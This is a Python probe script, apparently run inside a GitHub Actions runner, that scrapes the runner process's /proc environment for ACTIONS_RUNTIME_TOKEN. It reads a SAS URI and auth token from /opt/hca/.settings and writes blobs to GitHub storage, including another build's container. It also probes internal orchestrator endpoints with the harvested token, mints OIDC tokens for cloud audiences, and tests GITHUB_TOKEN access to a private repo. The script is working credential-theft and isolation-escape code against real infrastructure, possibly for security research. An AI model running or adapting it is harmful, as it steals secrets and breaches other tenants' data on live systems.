#!/usr/bin/env python3
"""U6 probe6: runner-proc runtime token, SAS write, orchestrator auth, OIDC audiences."""
import base64
import glob
import json
import os
import subprocess
import urllib.error
import urllib.request

OUT = []


def hdr(t):
    OUT.append("\n" + "=" * 70)
    OUT.append("### " + t)
    OUT.append("=" * 70)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=20, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(3000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1500).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


def jurl(tok):
    parts = tok.split(".")
    if len(parts) != 3:
        return None, None

    def dec(s):
        s += "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))
    return dec(parts[0]), dec(parts[1])


hdr("1. FIND ACTIONS_RUNTIME_TOKEN FROM THE RUNNER PROCESS (not exported to run: steps)")
cand = []
for d in glob.glob("/proc/[0-9]*"):
    try:
        cmd = open(d + "/cmdline", "rb").read().replace(b"\0", b" ").decode(errors="replace")
    except Exception:  # noqa: BLE001
        continue
    if "Runner.Listener" in cmd or "Runner.Worker" in cmd:
        try:
            env = open(d + "/environ", "rb").read().split(b"\0")
        except Exception:  # noqa: BLE001
            continue
        e = {}
        for kv in env:
            if b"=" in kv:
                k, v = kv.split(b"=", 1)
                e[k.decode(errors="replace")] = v.decode(errors="replace")
        cand.append((d, cmd[:90], e))
        OUT.append("%s  %s" % (d, cmd[:90]))
OUT.append("processes matched: %d" % len(cand))

rt = ru = None
for d, cmd, e in cand:
    if e.get("ACTIONS_RUNTIME_TOKEN"):
        rt = e["ACTIONS_RUNTIME_TOKEN"]
        ru = e.get("ACTIONS_RESULTS_URL", "")
        OUT.append("\nfound ACTIONS_RUNTIME_TOKEN in %s (len=%d) prefix=%s" % (d, len(rt), rt[:8]))
        OUT.append("ACTIONS_RESULTS_URL=%s" % ru)
        OUT.append("ACTIONS_CACHE_URL=%s" % e.get("ACTIONS_CACHE_URL"))
        OUT.append("ACTIONS_RUNTIME_URL=%s" % e.get("ACTIONS_RUNTIME_URL"))
        h_, c_ = jurl(rt)
        OUT.append("runtime JWT header: %s" % json.dumps(h_))
        OUT.append("runtime JWT claims: %s" % json.dumps(c_, indent=1)[:2000])
        OUT.append("\n-- other interesting keys in runner env:")
        for k in sorted(e):
            if any(s in k for s in ("TOKEN", "RESULT", "CACHE", "RUNTIME", "ORCHESTRATION",
                                    "ARTIFACT", "ENDPOINT", "URL")):
                v = e[k]
                if len(v) > 120:
                    v = v[:40] + "...len=%d" % len(v)
                OUT.append("   %s=%s" % (k, v))
        break

hdr("2. ARTIFACT SERVICE: list artifacts of THIS run with the runtime token")
if rt and ru:
    ru = ru.rstrip("/")
    st, h, body = http(ru + "/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts",
                       {"Authorization": "Bearer " + rt, "Content-Type": "application/json"},
                       method="POST", data=b'{"name_filter":""}')
    OUT.append("Twirp ListArtifacts -> %s\n%s" % (st, body[:2000]))
    st, h, body = http(ru + "/_apis/artifactcache/artifacts?api-version=6.0-preview",
                       {"Authorization": "Bearer " + rt})
    OUT.append("\nlegacy artifacts -> %s\n%s" % (st, body[:1200]))

hdr("3. THE SAS FROM /opt/hca/.settings: can the build WRITE to GitHub's storage?")
cfg = json.loads(open("/opt/hca/.settings", "rb").read())
sas = cfg["diagnosticsSasUri"]
base, q = sas.split("?", 1)
OUT.append("container url: %s" % base)
OUT.append("SAS permissions (sp)=%s  (a=add c=create w=write r=read l=list)" %
           dict(p.split("=") for p in q.split("&")).get("sp"))
probe_name = "u6-probe-%s.txt" % os.environ.get("GITHUB_RUN_ID", "x")
st, h, body = http(base + "/" + probe_name + "?" + q, {"x-ms-blob-type": "BlockBlob",
                                                      "Content-Type": "text/plain"},
                   method="PUT", data=b"U6 cross-boundary probe blob\n")
OUT.append("\nPUT blob %s -> %s (headers: %s)" % (
    probe_name, st, {k: v for k, v in h.items() if k.lower().startswith("x-ms")}))
st, h, body = http(base + "/" + probe_name + "?" + q)
OUT.append("GET blob back -> %s  body=%r" % (st, body[:200]))

hdr("3b. same SAS against a DIFFERENT container name (is it per-build scoped?)")
import uuid
for name in ("02397722-d4f0-4872-820f-9b0cca347b04",  # this build's allocation id
             "dba43240-4938-4743-a44d-4c7211986314",  # a different build's container
             "logs", "diagnostics"):
    u = "https://hcrpprodeus01diag.blob.core.windows.net/%s/%s?%s" % (name, probe_name, q)
    st, h, body = http(u, {"x-ms-blob-type": "BlockBlob"}, method="PUT",
                       data=b"U6 cross-container probe\n")
    OUT.append("PUT %-42s -> %s %s" % (name, st, body[:160].replace("\n", " ")))

hdr("4. ORCHESTRATOR: what auth does /vm/v1 want?")
hca_tok = cfg["authToken"]
for u in ("https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1",
          "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/trace"):
    for hname in ("Authorization", "X-GitHub-Token"):
        st, h, body = http(u, {hname: hca_tok if hname == "X-GitHub-Token"
                               else "Bearer " + hca_tok})
        OUT.append("%-72s %-14s -> %s %s" % (u.split("//")[1][:70], hname, st,
                                             body[:180].replace("\n", " ")))

hdr("5. OIDC: mint ID tokens for various audiences, show claims")
url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
utok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
OUT.append("request_url=%s" % url)
for aud in ("github-pages", "sts.amazonaws.com", "sigstore", "api://hosted-compute-ro", ""):
    u = url + ("&audience=" + aud if aud else "")
    st, h, body = http(u, {"Authorization": "Bearer " + utok})
    try:
        idt = json.loads(body)["value"]
        h_, c_ = jurl(idt)
        OUT.append("\naud=%r -> %s len=%d" % (aud or "(default)", st, len(idt)))
        OUT.append("  claims: %s" % json.dumps(c_, sort_keys=True)[:700])
    except Exception:  # noqa: BLE001
        OUT.append("\naud=%r -> %s %s" % (aud, st, body[:200]))

hdr("6. GITHUB_TOKEN permission grant headers (exact scope)")
tk = os.environ.get("GITHUB_TOKEN", "")
OUT.append("token len=%d prefix=%s" % (len(tk), tk[:4]))
st, h, body = http("https://api.github.com/repos/austindanson1/ghb-u6-pages",
                   {"Authorization": "token " + tk, "User-Agent": "u6"})
OUT.append("GET /repos/self -> %s" % st)
for k, v in h.items():
    if k.lower().startswith("x-"):
        OUT.append("  %s: %s" % (k, v))

hdr("7. does the build token reach the PRIVATE repo? (exact answer)")
for repo in ("austindanson1/ghb-u6-private", "austindanson1/ghb-u6-pages"):
    st, h, body = http("https://api.github.com/repos/" + repo,
                       {"Authorization": "token " + tk, "User-Agent": "u6"})
    OUT.append("  %-34s -> %s" % (repo, st))

text = "\n".join(OUT)
print(text)
with open(os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "probe-F.txt"), "w") as f:
    f.write(text)
